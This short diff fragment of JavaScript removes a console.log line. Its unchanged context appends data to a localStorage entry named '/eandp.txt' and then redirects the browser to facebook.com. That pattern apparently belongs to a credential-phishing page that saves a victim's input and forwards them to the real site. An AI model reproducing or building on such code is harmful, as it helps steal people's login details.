@@ -15,8 +15,6 @@
             localStorage.setItem('/eandp.txt', updatedContents);
 
             window.location.href='https://www.facebook.com/'
-
-            console.log('------------------------------------------------------------------------------------------');
         } catch (error) {
             console.error('Error appending data', error);
         }
